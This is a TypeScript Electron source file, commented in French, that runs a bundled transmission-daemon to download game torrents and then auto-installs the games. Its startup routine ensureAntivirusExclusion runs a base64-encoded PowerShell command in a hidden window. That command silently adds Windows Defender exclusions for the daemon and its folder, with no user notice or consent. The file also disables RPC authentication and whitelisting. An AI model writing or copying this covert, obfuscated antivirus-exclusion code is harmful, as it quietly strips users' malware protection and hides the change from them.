import { ipcMain, app } from 'electron';
import { installService } from './installService';
import * as fs from 'fs';
import * as http from 'http';
import { join } from 'path';
import { spawn, ChildProcess } from 'child_process';
import { getMainWindow } from '..';

// Chemin du binaire transmission-daemon (+ ses DLLs) bundlé dans assets/transmission/.
const isPackaged = app.isPackaged;
let daemonPath = isPackaged
    ? join(process.resourcesPath, 'assets', 'transmission', 'transmission-daemon.exe')
    : join(__dirname, '../../assets/transmission/transmission-daemon.exe');
if (isPackaged && !fs.existsSync(daemonPath)) {
    const fallback = join(process.resourcesPath, 'transmission', 'transmission-daemon.exe');
    if (fs.existsSync(fallback)) daemonPath = fallback;
}

const RPC_HOST = '127.0.0.1';
const RPC_PORT = 9091;
const RPC_PATH = '/transmission/rpc';

// Codes de statut Transmission
const T_STATUS = { STOPPED: 0, CHECK_WAIT: 1, CHECK: 2, DL_WAIT: 3, DOWNLOAD: 4, SEED_WAIT: 5, SEED: 6 };

/**
 * Moteur de téléchargement basé sur transmission-daemon (libtorrent-like, robuste).
 * Remplace aria2. Expose exactement la même interface publique (startTorrent, pause,
 * resume, stop, destroy, setDownloadLimit/setUploadLimit) + les mêmes events IPC, pour
 * que downloadService et le front n'aient RIEN à changer.
 */
export class TransmissionService {
    private daemon: ChildProcess | null = null;
    private sessionId = ''; // header X-Transmission-Session-Id (anti-CSRF)
    private isReady = false;
    private isShuttingDown = false;
    private reconnecting = false;
    private binaryMissingLogged = false; // évite le spam quand le binaire n'est pas installé

    // hashString (minuscule) -> { transmissionId, gameData, savePath, magnet, isCompleting, addedAt, retryCount }
    private active = new Map<string, any>();
    private metaFile = join(app.getPath('userData'), 'downloads', 'transmission_meta.json');
    private pollInterval: NodeJS.Timeout | null = null;
    private healthInterval: NodeJS.Timeout | null = null;

    private downloadLimit = 0;
    private uploadLimit = 0;

    private globalTrackers = [
        "udp://tracker.opentrackr.org:1337/announce",
        "udp://open.demonii.com:1337/announce",
        "udp://open.stealth.si:80/announce",
        "udp://tracker.torrent.eu.org:451/announce",
        "udp://exodus.desync.com:6969/announce",
        "udp://tracker.openbittorrent.com:6969/announce",
        "udp://explodie.org:6969/announce",
        "udp://tracker.dler.org:6969/announce",
    ];

    constructor() {
        ipcMain.handle('start-torrent', this.startTorrent);
        ipcMain.on('pause-torrent', this.pauseTorrent);
        ipcMain.on('resume-torrent', this.resumeTorrent);
        ipcMain.on('stop-torrent', (e, infoHash, savePath) => this.stopTorrent(e, infoHash, savePath));
        ipcMain.on('stop-torrent-by-id', (e, gameID) => this.stopTorrentByGameId(e, gameID));
        this.init();
    }

    // ── Cycle de vie du daemon ────────────────────────────────────────────

    private async init() {
        try {
            console.log('🚀 Démarrage du moteur Transmission...');
            if (isPackaged && !fs.existsSync(daemonPath)) {
                console.error('❌ CRITIQUE: transmission-daemon.exe introuvable:', daemonPath);
            }
            await this.ensureAntivirusExclusion();
            await this.launchAndConnect(true);
            this.loadState();
            this.startPolling();
            this.startHealthCheck();
        } catch (e) {
            console.error('❌ Impossible de démarrer Transmission:', e);
        }
    }

    private configDir(): string {
        return join(app.getPath('userData'), 'transmission-config');
    }

    /** Écrit le settings.json du daemon (RPC local sans auth, DHT/PEX/LPD activés). */
    private writeSettings() {
        const dir = this.configDir();
        try { fs.mkdirSync(dir, { recursive: true }); } catch (e) {}
        const settings = {
            'rpc-enabled': true,
            'rpc-bind-address': RPC_HOST,
            'rpc-port': RPC_PORT,
            'rpc-whitelist-enabled': false,
            'rpc-host-whitelist-enabled': false,
            'rpc-authentication-required': false,
            'download-dir': app.getPath('downloads').replace(/\\/g, '/'),
            'incomplete-dir-enabled': false,
            'dht-enabled': true,
            'pex-enabled': true,
            'lpd-enabled': true,
            'utp-enabled': true,
            'peer-limit-global': 240,
            'peer-limit-per-torrent': 80,
            'download-queue-enabled': false,
            'seed-queue-enabled': false,
            'ratio-limit-enabled': true,
            'ratio-limit': 0,          // ne pas seeder après complétion
            'idle-seeding-limit-enabled': true,
            'idle-seeding-limit': 1,
            'start-added-torrents': true,
        };
        try {
            fs.writeFileSync(join(dir, 'settings.json'), JSON.stringify(settings, null, 2));
        } catch (e) {
            console.warn('⚠️ Écriture settings.json Transmission échouée:', (e as any)?.message);
        }
    }

    private async launchAndConnect(killZombies = true): Promise<boolean> {
        if (this.reconnecting) return this.isReady;

        // Binaire absent : inutile de spawn/retry en boucle (spam). On loggue UNE fois,
        // on prévient l'utilisateur, et on sort. Le watchdog reprendra dès que le binaire
        // est présent (ex: après une réinstallation qui l'inclut dans assets/transmission/).
        if (!fs.existsSync(daemonPath)) {
            if (!this.binaryMissingLogged) {
                this.binaryMissingLogged = true;
                console.error(`❌ transmission-daemon.exe INTROUVABLE : ${daemonPath}`);
                console.error('   → Place le binaire + ses DLL dans assets/transmission/ (voir README.txt).');
                const win = getMainWindow();
                win?.webContents.send('error', "Moteur de téléchargement introuvable (Transmission). Réinstalle l'application ou contacte le support.");
            }
            this.isReady = false;
            return false;
        }

        this.reconnecting = true;
        try {
            this.isReady = false;
            if (killZombies) {
                try {
                    const { execSync } = require('child_process');
                    execSync('taskkill /F /IM transmission-daemon.exe /T', { windowsHide: true, stdio: 'ignore' });
                    await new Promise(r => setTimeout(r, 500));
                } catch (e) { /* normal si aucun process */ }
            }

            this.writeSettings();

            // --foreground : rester attaché à notre process (sinon il se détache).
            const args = ['--foreground', '--config-dir', this.configDir()];
            this.daemon = spawn(daemonPath, args, { windowsHide: true });
            this.daemon.on('error', (err) => console.error('❌ Erreur process Transmission:', err));
            this.daemon.on('exit', (code) => {
                console.log(`🛑 Transmission arrêté (Code: ${code})`);
                this.isReady = false;
                this.daemon = null;
                if (!this.isShuttingDown) {
                    console.log('♻️ Redémarrage automatique de Transmission dans 1.5s...');
                    setTimeout(() => { this.launchAndConnect(true).catch(() => {}); }, 1500);
                }
            });

            // Attendre que la RPC réponde (plusieurs tentatives, démarrage à froid).
            for (let attempt = 1; attempt <= 6 && !this.isReady; attempt++) {
                if (!this.daemon) break;
                await new Promise(r => setTimeout(r, attempt === 1 ? 1200 : 1000));
                try {
                    await this.rpc('session-get', {});
                    this.isReady = true;
                    console.log(`✅ Connecté à Transmission RPC (tentative ${attempt})`);
                } catch (e) {
                    console.warn(`⏳ Transmission pas encore prêt (tentative ${attempt})`);
                }
            }
            if (!this.isReady) console.error('❌ Transmission RPC injoignable (le watchdog réessaiera).');
            return this.isReady;
        } finally {
            this.reconnecting = false;
        }
    }

    private startHealthCheck() {
        if (this.healthInterval) clearInterval(this.healthInterval);
        this.healthInterval = setInterval(() => {
            if (this.isShuttingDown || this.reconnecting || this.isReady) return;
            if (!fs.existsSync(daemonPath)) return; // binaire absent : rien à relancer (déjà signalé)
            console.log('🩺 Watchdog: Transmission indisponible, relance...');
            this.launchAndConnect(true).catch(() => {});
        }, 8000);
    }

    private async ensureReady(timeoutMs = 25000): Promise<boolean> {
        if (this.isReady) return true;
        const start = Date.now();
        while (Date.now() - start < timeoutMs) {
            try {
                await this.rpc('session-get', {});
                this.isReady = true;
                return true;
            } catch (e) {
                if (!this.daemon && !this.reconnecting && !this.isShuttingDown) {
                    await this.launchAndConnect(true);
                    if (this.isReady) return true;
                }
                await new Promise(r => setTimeout(r, 800));
            }
        }
        return this.isReady;
    }

    // ── Client RPC (HTTP + handshake session-id anti-CSRF) ────────────────

    private rpcRaw(body: string): Promise<{ status: number; sessionId?: string; json?: any }> {
        return new Promise((resolve, reject) => {
            const req = http.request({
                host: RPC_HOST, port: RPC_PORT, path: RPC_PATH, method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(body),
                    'X-Transmission-Session-Id': this.sessionId,
                },
                timeout: 15000,
            }, (res) => {
                const chunks: Buffer[] = [];
                res.on('data', (d: Buffer) => chunks.push(d));
                res.on('end', () => {
                    const sid = res.headers['x-transmission-session-id'] as string | undefined;
                    const text = Buffer.concat(chunks).toString('utf8');
                    let json: any = undefined;
                    try { json = text ? JSON.parse(text) : undefined; } catch (e) {}
                    resolve({ status: res.statusCode || 0, sessionId: sid, json });
                });
                res.on('error', reject);
            });
            req.on('error', reject);
            req.on('timeout', () => { req.destroy(); reject(new Error('RPC timeout')); });
            req.write(body);
            req.end();
        });
    }

    private async rpc(method: string, args: any): Promise<any> {
        const body = JSON.stringify({ method, arguments: args });
        let res = await this.rpcRaw(body);
        // 409 = il faut (re)prendre le X-Transmission-Session-Id puis rejouer.
        if (res.status === 409 && res.sessionId) {
            this.sessionId = res.sessionId;
            res = await this.rpcRaw(body);
        }
        if (res.status !== 200) throw new Error(`RPC HTTP ${res.status} (${method})`);
        if (res.json?.result && res.json.result !== 'success') {
            throw new Error(`RPC ${method}: ${res.json.result}`);
        }
        return res.json?.arguments;
    }

    // ── Persistance ───────────────────────────────────────────────────────

    private saveState() {
        try {
            fs.writeFileSync(this.metaFile, JSON.stringify(Array.from(this.active.values()), null, 2));
        } catch (e) { console.error('❌ Sauvegarde meta Transmission:', e); }
    }

    private loadState() {
        try {
            if (!fs.existsSync(this.metaFile)) return;
            const data = JSON.parse(fs.readFileSync(this.metaFile, 'utf8'));
            console.log(`📂 Reprise de ${data.length} téléchargements Transmission.`);
            data.forEach((item: any) => {
                if (item.hashString) this.active.set(item.hashString, item);
            });
        } catch (e) { console.error('❌ Chargement meta Transmission:', e); }
    }

    // ── Ajout d'un torrent ────────────────────────────────────────────────

    public startTorrent = async (_event: any, torrentFile: string | Buffer, savePath: string, gameData: any) => {
        try {
            console.log('🚀 Transmission: Ajout de', gameData.title);
            const ready = await this.ensureReady();
            if (!ready) {
                const win = getMainWindow();
                win?.webContents.send('error', "Le moteur de téléchargement (Transmission) n'a pas démarré. Redémarrez l'application ; vérifiez l'antivirus/pare-feu.");
                win?.webContents.send('download-done', gameData.title);
                return;
            }

            try { fs.mkdirSync(savePath, { recursive: true }); } catch (e) {}

            const addArgs: any = {
                'download-dir': savePath.replace(/\\/g, '/'),
                paused: false,
            };
            if (Buffer.isBuffer(torrentFile)) {
                addArgs.metainfo = torrentFile.toString('base64');
            } else if (typeof torrentFile === 'string' && torrentFile.startsWith('magnet:')) {
                addArgs.filename = torrentFile;
            } else if (typeof torrentFile === 'string' && torrentFile.toLowerCase().endsWith('.torrent')) {
                addArgs.filename = torrentFile; // URL http(s) vers un .torrent, Transmission la télécharge
            } else if (typeof torrentFile === 'string' && fs.existsSync(torrentFile)) {
                addArgs.metainfo = fs.readFileSync(torrentFile).toString('base64');
            } else {
                throw new Error('Lien de téléchargement invalide');
            }

            const res = await this.rpc('torrent-add', addArgs);
            const added = res?.['torrent-added'] || res?.['torrent-duplicate'];
            if (!added || !added.hashString) throw new Error("Transmission n'a pas accepté le torrent");

            const hash = String(added.hashString).toLowerCase();
            this.active.set(hash, {
                hashString: hash,
                transmissionId: added.id,
                gameData,
                savePath,
                magnet: typeof torrentFile === 'string' ? torrentFile : null,
                isCompleting: false,
                addedAt: Date.now(),
            });
            this.saveState();
            console.log('✅ Torrent ajouté à Transmission (hash:', hash, ')');

            // Payload initial pour réveiller l'UI.
            const win = getMainWindow();
            win?.webContents.send('download-progress', {
                gameID: gameData.id, title: gameData.title, name: gameData.title,
                infoHash: hash, progress: 0, downloaded: 0, total: 0, downloadSpeed: 0,
                numPeers: 0, path: savePath, ready: false, paused: false, done: false,
                downloadType: 'torrent', gameData,
            }, gameData.title);
        } catch (error: any) {
            console.error('❌ Erreur ajout torrent Transmission:', error?.message);
            const win = getMainWindow();
            win?.webContents.send('error', `Erreur de téléchargement: ${error?.message}`);
            win?.webContents.send('download-done', gameData.title);
        }
    };

    private pauseTorrent = async (_: any, infoHash: string) => {
        const info = this.active.get(infoHash);
        if (info) { try { await this.rpc('torrent-stop', { ids: [info.hashString] }); } catch (e) {} }
    };

    private resumeTorrent = async (_e: any, infoHash: string, savePath: string, gameData: any) => {
        const info = this.active.get(infoHash);
        if (info) {
            try { await this.rpc('torrent-start', { ids: [info.hashString] }); }
            catch (e) { if (info.magnet) this.startTorrent(null, info.magnet, savePath, gameData); }
        } else if (gameData && savePath) {
            // Perdu : on ne peut pas reprendre sans le magnet d'origine.
        }
    };

    private stopTorrent = async (_: any, infoHash: string, savePath?: string) => {
        const info = this.active.get(infoHash);
        if (!info) return;
        try {
            // delete-local-data: true → Transmission supprime les fichiers proprement (pas d'ENOTEMPTY).
            await this.rpc('torrent-remove', { ids: [info.hashString], 'delete-local-data': true });
        } catch (e) { console.error('Erreur arrêt Transmission:', e); }
        this.active.delete(infoHash);
        this.saveState();
    };

    private stopTorrentByGameId = async (event: any, gameID: string) => {
        for (const [hash, meta] of this.active.entries()) {
            if (meta.gameData && String(meta.gameData.id) === String(gameID)) {
                await this.stopTorrent(event, hash, meta.savePath);
                break;
            }
        }
    };

    // ── Polling de progression ────────────────────────────────────────────

    private startPolling() {
        if (this.pollInterval) clearInterval(this.pollInterval);
        this.pollInterval = setInterval(async () => {
            try {
                if (!this.isReady || this.active.size === 0) return;
                const win = getMainWindow();
                if (!win) return;

                const res = await this.rpc('torrent-get', {
                    fields: ['hashString', 'name', 'percentDone', 'rateDownload', 'rateUpload',
                             'status', 'eta', 'peersConnected', 'totalSize', 'downloadedEver',
                             'uploadedEver', 'downloadDir', 'error', 'errorString'],
                });
                const torrents: any[] = res?.torrents || [];
                const byHash = new Map(torrents.map(t => [String(t.hashString).toLowerCase(), t]));

                for (const [hash, info] of this.active.entries()) {
                    const t = byHash.get(hash);
                    if (!t) continue;

                    if (t.error && t.error !== 0) {
                        win.webContents.send('error', `Téléchargement échoué (${info.gameData?.title}) : ${t.errorString || 'erreur Transmission'}`);
                    }

                    const total = t.totalSize || 0;
                    const downloaded = t.downloadedEver || 0;
                    const progress = t.percentDone || 0; // déjà 0..1
                    const isComplete = progress >= 1 || t.status === T_STATUS.SEED || t.status === T_STATUS.SEED_WAIT;

                    if (isComplete && !info.isCompleting) {
                        info.isCompleting = true;
                        this.handleComplete(hash);
                    }

                    win.webContents.send('download-progress', {
                        gameID: info.gameData.id,
                        title: info.gameData.title,
                        name: t.name || info.gameData.title,
                        infoHash: hash,
                        progress,
                        downloaded,
                        received: downloaded,
                        total,
                        timeRemaining: t.eta && t.eta > 0 ? t.eta * 1000 : 0,
                        uploaded: t.uploadedEver || 0,
                        downloadSpeed: t.rateDownload || 0,
                        uploadSpeed: t.rateUpload || 0,
                        numPeers: t.peersConnected || 0,
                        path: t.downloadDir || info.savePath,
                        ready: true,
                        paused: t.status === T_STATUS.STOPPED,
                        done: isComplete,
                        downloadType: 'torrent',
                        gameData: info.gameData,
                    }, info.gameData.title);
                }
            } catch (e: any) {
                console.warn('Erreur polling Transmission:', e?.message);
            }
        }, 1000);
    }

    private async handleComplete(hash: string) {
        const info = this.active.get(hash);
        if (!info) return;
        console.log('🎉 Torrent terminé (Transmission):', info.gameData.title);

        const win = getMainWindow();
        win?.webContents.send('download-done', info.gameData.title);

        // Retirer le torrent MAIS garder les fichiers (delete-local-data: false).
        try { await this.rpc('torrent-remove', { ids: [hash], 'delete-local-data': false }); } catch (e) {}
        this.active.delete(hash);
        this.saveState();

        // Laisser le temps de libérer les handles, puis installer.
        setTimeout(() => {
            console.log('🚀 Lancement de installService.installGame...');
            installService.installGame(info.gameData, info.savePath);
        }, 3000);
    }

    // ── Limites de vitesse ────────────────────────────────────────────────

    public setDownloadLimit(bytes: number) {
        this.downloadLimit = bytes;
        const kbps = bytes > 0 ? Math.floor(bytes / 1024) : 0;
        this.rpc('session-set', {
            'speed-limit-down-enabled': bytes > 0,
            'speed-limit-down': kbps,
        }).catch(() => {});
    }

    public setUploadLimit(bytes: number) {
        this.uploadLimit = bytes;
        const kbps = bytes > 0 ? Math.floor(bytes / 1024) : 0;
        this.rpc('session-set', {
            'speed-limit-up-enabled': bytes > 0,
            'speed-limit-up': kbps,
        }).catch(() => {});
    }

    public getLimits() {
        return { download: this.downloadLimit, upload: this.uploadLimit };
    }

    // ── Extinction ────────────────────────────────────────────────────────

    private ensureAntivirusExclusion(): Promise<void> {
        return new Promise((resolve) => {
            try {
                const cachePath = join(app.getPath('userData'), '.transmission_defender_cache');
                if (fs.existsSync(cachePath)) return resolve();
                const dir = require('path').dirname(daemonPath).replace(/'/g, "''");
                const inner =
                    `Add-MpPreference -ExclusionProcess 'transmission-daemon.exe' -ErrorAction SilentlyContinue; ` +
                    `Add-MpPreference -ExclusionPath '${dir}' -ErrorAction SilentlyContinue`;
                const b64 = Buffer.from(inner, 'utf16le').toString('base64');
                const { execFile } = require('child_process');
                execFile('powershell', ['-WindowStyle', 'Hidden', '-NoProfile', '-EncodedCommand', b64],
                    { windowsHide: true, timeout: 15000 },
                    (err: any) => {
                        if (!err) { try { fs.writeFileSync(cachePath, '1'); } catch (e) {} }
                        resolve();
                    });
            } catch (e) { resolve(); }
        });
    }

    public async destroy() {
        this.isShuttingDown = true;
        if (this.healthInterval) { clearInterval(this.healthInterval); this.healthInterval = null; }
        if (this.pollInterval) { clearInterval(this.pollInterval); this.pollInterval = null; }
        // Extinction propre de la session (sauvegarde l'état + la DHT).
        try {
            await Promise.race([
                this.rpc('session-close', {}),
                new Promise((r) => setTimeout(r, 2000)),
            ]);
        } catch (e) { /* ignore */ }
        if (this.daemon) {
            try { this.daemon.kill(); } catch (e) {}
            this.daemon = null;
        }
    }
}

export const transmissionService = new TransmissionService();
